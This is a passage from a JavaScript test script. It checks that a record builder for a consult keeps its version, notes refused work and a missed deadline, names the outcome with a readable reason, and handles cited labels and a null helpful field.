	digs: digsFixture,
	budget: { max: 8, spawned: 8, refused: 4 },
	deadlineMs: 180_000,
	deadlineHit: true,
	text: "answer",
	verdict: { kind: "quote", citedLabels: ["garden#1", "nope#9"] },
	now: 1,
});
check("version stays 1", built.version === 1);
check("a truncated consult says so in the entry", built.budget.digsRefused === 4 && built.budget.deadlineHit === true);
check("and the outcome names it, with a reason a human can read", built.outcome === "deadline" && built.error?.includes("wall clock"));
check("cited labels are kept verbatim, ids only when they resolve", built.answer.citedLabels.length === 2 && built.answer.citedHitIds.length === 1);
check("helpful is null in the builder too", built.helpful === null);

console.log(failures === 0 ? "\nall green" : `\n${failures} failure(s)`);
process.exit(failures === 0 ? 0 : 1);
